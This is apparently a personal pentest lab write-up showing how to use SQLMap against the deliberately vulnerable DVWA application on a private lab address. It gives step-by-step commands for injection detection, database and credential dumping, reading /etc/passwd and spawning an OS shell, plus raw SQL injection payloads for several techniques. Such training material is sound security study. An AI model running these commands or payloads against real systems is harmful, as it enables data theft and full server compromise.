<h1 align="center"> SQLMap For SQL Injection (SQLI) </h1>


<img width="1200" height="800" alt="image" src="https://media.licdn.com/dms/image/v2/D5612AQEpNR5Xs_2AAg/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1677916186269?e=2147483647&v=beta&t=hfF128B1HCQsL30eoRBoveZk1-pcHQbjYh5g1G8EyOk" />

## Scope
- **Attacker**: Kali Linux (Use SQLMap)
- **Victim**: DVWA (URL: http://192.168.127.129/dvwa/)

---

---

# SQLMap Methodology

---


## 1. Get session Cookies 

### Using cURL to Get Session

#### Get session ID by logging in
````
curl -c cookies.txt -d "username=admin&password=password&Login=Login" \
  "http://192.168.127.129/dvwa/login.php"
````
<img width="1100" height="600" alt="image" src="https://github.com/user-attachments/assets/fbc0f0ae-b591-4dca-a958-d8a47dbfb8e5" />

#### View the cookies
````
cat cookies.txt
````
<img width="1100" height="600" alt="image" src="https://github.com/user-attachments/assets/c204ddaa-5ae3-4681-9b51-cc94f4aed2af" />


### Browser developer tools
 - Login to DVWA
 - Press F12 → Network tab
 - Refresh page
 - Copy Cookie value from any request
  
<img width="1917" height="577" alt="image" src="https://github.com/user-attachments/assets/79420442-779c-49be-befe-d2c7eeb715ef" />

<img width="1920" height="860" alt="image" src="https://github.com/user-attachments/assets/231c738b-c505-4477-9398-a62f7ae4efd4" />

- this my `Cookie`:
````
PHPSESSID=64a18e92a18ba786a311b699aa6a8d78
````

---


## 2. Basic SQL Injection Testing

### Low security Level 
#### GET-based SQL injection
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" \
  --batch
````
<img width="1547" height="740" alt="image" src="https://github.com/user-attachments/assets/da124d86-391a-4c16-957c-71f81b0eb6a1" />

- We can type this `Payload` in browser like this:
````
http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1%27%20AND%20(SELECT%205291%20FROM%20(SELECT(SLEEP(5)))KgHa)--%20Tlcf&Submit=Submit
````
<img width="1322" height="636" alt="image" src="https://github.com/user-attachments/assets/8edec9fe-5ad4-4073-b29b-76a89e040457" />



#### With specific parameter testing
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -p id --batch
````
<img width="1418" height="704" alt="image" src="https://github.com/user-attachments/assets/2da81803-d5e9-4bfd-94a0-5aafed2424af" />

- `-p id`: Tells SQLMap to test the `id` parameter for injection.
- `--batch`: Runs in non-interactive mode, automatically uses default answers to prompts (great for scripting or automation).
- **This command is ideal for:
• 	Authenticated SQL injection testing in DVWA
• 	Automated exploitation in exam/lab environments**


### Medium Security Level:

#### POST-based SQL injection

````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=medium" --batch
````
<img width="1568" height="709" alt="image" src="https://github.com/user-attachments/assets/30f5aa72-7a90-4abb-9e78-0d8adb3dfef7" />



### High Security Level:

#### Testing with different session
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=high" --batch
````
<img width="1422" height="717" alt="image" src="https://github.com/user-attachments/assets/d4d16eee-574c-4c4a-8bcb-61275fb8d94f" />


## 3. Database Enumeration

### Get database banner and version
````

sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --banner --current-user --current-db --batch
````
<img width="1911" height="725" alt="image" src="https://github.com/user-attachments/assets/f171cb5b-1637-4054-8cc8-0f568c6a7b86" />

<img width="1185" height="327" alt="image" src="https://github.com/user-attachments/assets/8708cfba-5785-4682-bfb5-ffc8b30392bb" />

- `--banner`: Retrieves the database banner — version and vendor info (e.g., MySQL 5.7.33).
- `--current-user`: Identifies the current database user (e.g., `root@localhost`).
- `--current-db`: Reveals the current active database (e.g., `dvwa`).
- **This command is ideal for:
  - Initial environment profiling in DVWA or exam labs
  - Verifying SQL injection viability**


### List all databases
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=Y64a18e92a18ba786a311b699aa6a8d78; security=low" --dbs --batch
````
<img width="1900" height="770" alt="image" src="https://github.com/user-attachments/assets/60626688-55c4-42fe-8f30-f92c2df7ca08" />

<img width="1238" height="382" alt="image" src="https://github.com/user-attachments/assets/5cec780a-95ef-45d1-ad3a-f069b453c9c4" />

- `-dbs`: Tells SQLMap to enumerate all available databases on the server.
- **This command is ideal for:
  • 	Mapping the database structure before targeting specific tables
  • 	Planning data extraction (e.g., dumping users, credentials, logs)**



### List tables in DVWA database
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -D dvwa --tables --batch
````
<img width="1906" height="764" alt="image" src="https://github.com/user-attachments/assets/4ad9681a-209a-4603-acc9-67b66f9ee692" />

<img width="1199" height="331" alt="image" src="https://github.com/user-attachments/assets/8b82763f-7d26-406c-86e5-2f0ec20a3f6b" />

- `--tables`: Enumerates all tables in the `dvwa` database.
- **This command is ideal for:
  • 	Mapping the internal structure of the DVWA database
  • 	Planning targeted data extraction (e.g., dumping credentials from `users`)**


### Dump users table
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78D; security=low" -D dvwa -T users --columns --dump --batch
````
<img width="1910" height="711" alt="image" src="https://github.com/user-attachments/assets/81ba8059-2c1c-4aa5-b962-0a375918a39b" />

<img width="1195" height="760" alt="image" src="https://github.com/user-attachments/assets/e5bb555c-7a03-4fa5-abf5-b4c0042c0e0e" />


- `-D dvwa`: Specifies the target database — in this case, `dvwa`.
- `--table`: Tells SQLMap to enumerate all tables within the `dvwa` database.
- **This command is ideal for:
  - Mapping the internal structure of the `dvwa` database
  - Planning targeted data extraction (e.g., dumping credentials from `users`)**


### Dump all tables from dvwa database
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -D dvwa --dump-all --batch
````
<img width="1906" height="727" alt="image" src="https://github.com/user-attachments/assets/d52618c0-4986-404d-8f2c-9ba5f9252ced" />

<img width="1207" height="737" alt="image" src="https://github.com/user-attachments/assets/7b1666a6-867b-453e-b5eb-7d46abb0cc65" />

- `--dump-all`: Tells SQLMap to dump all tables and data from the `dvwa` database.
- **This command is ideal for:
  • 	Complete data extraction from the vulnerable DVWA database
  • 	Building a full post-exploitation report**

- All of these `Username` and `Password` we can also login like this:
<img width="1192" height="192" alt="image" src="https://github.com/user-attachments/assets/6b42920f-01b9-46c4-b488-e5ab53962e73" />

<img width="937" height="567" alt="image" src="https://github.com/user-attachments/assets/4d4a79c9-b91c-43bd-89ce-1fa3c0852a74" />


## 4. Advanced Enumeration Techniques

### Get database users and privileges
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --users --passwords --privileges --batch
````
<img width="1913" height="689" alt="image" src="https://github.com/user-attachments/assets/6d01c3ec-c992-4398-9bba-be929f9cedb0" />

<img width="1396" height="431" alt="image" src="https://github.com/user-attachments/assets/3fd4c152-746b-4aaa-a3c5-c5f8f99e4c1e" />

<img width="552" height="745" alt="image" src="https://github.com/user-attachments/assets/95936641-9c18-4a14-855a-1ab0a47a6240" />

<img width="527" height="597" alt="image" src="https://github.com/user-attachments/assets/5866d46d-69d1-4334-9bc6-20bf6643b419" />

- `--users`: enumerates `database user` (e.g. `root`, `webapp`, `admin`).
- `--passwords`: Attempts to extract password hashes for each user (if accessible).]
- `--privileges`: Lists privileges assigned to each user (e.g., `SELECT`, `FILE`, `SUPER`).
- **This command is ideal for:
  • 	Credential harvesting for offline cracking
  • 	Privilege escalation mapping
  • 	Planning targeted exploitation or authentication bypass**
- In this we see very details.



### Get database schema
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --schema --batch
````
<img width="1900" height="689" alt="image" src="https://github.com/user-attachments/assets/a7d6b0d7-d4f1-4695-9318-d6598c26be5d" />

<img width="1490" height="782" alt="image" src="https://github.com/user-attachments/assets/c3e8778d-bcff-47be-b5b3-7255a7a8481a" />

<img width="821" height="757" alt="image" src="https://github.com/user-attachments/assets/5619e2fd-4a5f-4695-bd09-43a71313fe90" />



- `--schema`: Retrieves the full database schema, including databases, tables, and columns.
- **This command is ideal for:
  • 	Mapping the entire database structure
  • 	Planning targeted data extraction**

### Check if user is DBA
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --is-dba --batch
````
<img width="1907" height="772" alt="image" src="https://github.com/user-attachments/assets/7dd45b6f-226b-47ed-a80a-1afdfe9d2bc0" />


- `--is-dbs`: Checks whether the current database user has DBA (administrative) privileges.
- **This command is ideal for:
  • 	Privilege escalation planning
  • 	Determining whether you can:
  • 	Read system files (`LOAD_FILE`)
  • 	Write files (`SELECT INTO OUTFILE`)
  • 	Execute OS commands (`--os-shell`)
  • 	Deciding whether to pivot into post-exploitation**


---


##  5. File System Operations 
### Read local files
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --file-read="/etc/passwd" --batch
````
<img width="1903" height="724" alt="image" src="https://github.com/user-attachments/assets/96d64011-15a0-4f2e-8256-7bca47945b42" />

<img width="1719" height="353" alt="image" src="https://github.com/user-attachments/assets/d8462e92-23a5-4085-8f37-fe7115dfb8ca" />

- ``--file-read="/etc/passwd"``: Attempts to read the contents of `/etc/passwd` on the server using SQL injection and DBMS file read capabilities.
- **This command is ideal for:
  • 	Post-exploitation in SQLi labs
  • 	Demonstrating lateral movement potential
  • 	Validating DBMS-level file access**


### Check if file write is possible
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --os-shell  --batch
````
<img width="1903" height="708" alt="image" src="https://github.com/user-attachments/assets/90c9e9b4-0b39-4c48-9dfe-5281f43b714e" />

<img width="1417" height="778" alt="image" src="https://github.com/user-attachments/assets/e74c1ec5-4f54-41e1-8843-c931a6c5c4c7" />

- `--os-shell`: Attempts to spawn an interactive OS shell via SQL injection, if the DBMS and privileges allow.
- **This command is ideal for:
  • 	Post-exploitation in vulnerable lab environments
  • 	Demonstrating full system compromise via SQL injection**

---



## 6. Blind SQL Injection Testing

### Time-based blind SQLi
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" --technique=T --batch
````

- `--technique=T`: Forces SQLMap to use Time-based blind injection only (`T` = Time).
- **This command is ideal for:
  • 	Exploiting blind SQL injection with no visible feedback
  • 	Validating injection points in DVWA’s SQLi_Blind module**



---


---
## SQLMap Options

### Common Parameters
| Flag / Option                    |                                     What it does (short) | Notes / example                                               |
| -------------------------------- | -------------------------------------------------------: | ------------------------------------------------------------- |
| `--batch`                        |              Run non-interactively (auto-answer prompts) | Use in scripts or automated runs                              |
| `--level=1-5`                    |            Set test depth (higher = more payloads/tests) | `--level=3` is a common default; use `4–5` for thorough tests |
| `--risk=0-3`                     |        Set risk level (higher = more intrusive payloads) | `--risk=2` or `3` enables riskier payloads (use with caution) |
| `--threads=10`                   |               Number of concurrent HTTP requests (speed) | More threads = faster but noisier; watch target stability     |
| `--dbms=mysql`                   |                          Force DBMS fingerprint to MySQL | Useful when you know the backend (e.g., DVWA)                 |
| `--tamper=space2comment,between` |                 Use tamper scripts to obfuscate payloads | Multiple scripts comma-separated; helps bypass some WAFs      |
| `--proxy=http://127.0.0.1:8080`  | Route traffic through an intercepting proxy (e.g., Burp) | Useful for inspecting requests/responses in Burp Suite        |
| `--flush-session`                |      Clear previously stored session data for the target | Ensures a fresh run (clears saved injection points)           |



### Technique Specific:
|            Flag | Name                | What it does (short)                                                     | When to use / notes                                                                  | Example payload pattern (non-destructive)                                 |
| --------------: | ------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| `--technique=B` | Boolean-based blind | Infers data by changing query so page/response differs for TRUE vs FALSE | Use when responses don’t show data but change with conditions                        | `' OR (SELECT SUBSTRING((SELECT database()),1,1))='a' -- -`               |
| `--technique=E` | Error-based         | Forces DB errors that leak data in the error message                     | Use when the app returns DB errors or verbose messages                               | `1' AND extractvalue(1,concat(0x7e,(SELECT @@version))) -- -`             |
| `--technique=U` | Union query-based   | Uses `UNION SELECT` to return attacker-controlled results in the page    | Use when the original query returns rows (and number/type of columns can be matched) | `1' UNION SELECT NULL,NULL,'text' -- -`                                   |
| `--technique=T` | Time-based blind    | Uses DB sleep/delay functions to infer true/false via response timing    | Use when content is not returned and error messages are suppressed                   | `1' AND IF((SELECT SUBSTRING((SELECT user()),1,1))='a', SLEEP(5),0) -- -` |
| `--technique=Q` | Inline queries      | Executes inline/stacked or embedded sub-queries depending on DB support  | Use when DB accepts stacked/inline statements or subqueries (DB-specific)            | `1; SELECT @@version; -- ` *(DB must allow stacked queries)*              |



---



# Monitoring And Defense

## Using Proxy with Burp Suite:

- First start `Burp Suite`:
<img width="1918" height="810" alt="image" src="https://github.com/user-attachments/assets/d3aef4bd-8be5-4391-80a9-c0a2fbdd51cc" />

<img width="860" height="738" alt="image" src="https://github.com/user-attachments/assets/95ff800c-5f86-4118-9268-6f7839f9304c" />

<img width="1916" height="887" alt="image" src="https://github.com/user-attachments/assets/52e9f9aa-1250-4055-9f75-8e6d940025b5" />

- And after type this command:
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" \
  --proxy="http://127.0.0.1:8080" \
  --batch
````
<img width="1739" height="752" alt="image" src="https://github.com/user-attachments/assets/9886dc4f-6cd6-4a22-a580-bc312bb1a0cd" />


## Verbose Output for Debugging:
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=64a18e92a18ba786a311b699aa6a8d78; security=low" -v 6 --batch 
````
<img width="1911" height="496" alt="image" src="https://github.com/user-attachments/assets/0f6b31e8-44ee-4794-81a4-f7f16ccf15bf" />

<img width="1668" height="765" alt="image" src="https://github.com/user-attachments/assets/6025bd4f-7bf4-4831-ae13-c9e66028b515" />

<img width="1683" height="686" alt="image" src="https://github.com/user-attachments/assets/d8224ad5-9869-4e57-afdc-88a5c8ee1dce" />

<img width="1690" height="442" alt="image" src="https://github.com/user-attachments/assets/9c4a8c15-b1aa-4fea-a9a4-57653e6f8746" />

- In this we see like in our `Burp Suite`:
<img width="1918" height="874" alt="image" src="https://github.com/user-attachments/assets/5a98904f-2f2b-4782-adaf-abf86c47d88e" />

----


## finished Of SQLMap with SQL Injection

## **To see Details:** [SQLMap](https://github.com/Nin-Kanong/pentest-writeups/blob/main/3.%20Vulnerability%20Assessment/2.%20Web%20Application%20Vulnerability%20Assessment/3.%20sqlmap.md)
----

## Practice By: Nin Kanong (k4n0ng)

### Date: 25/10/2025

````
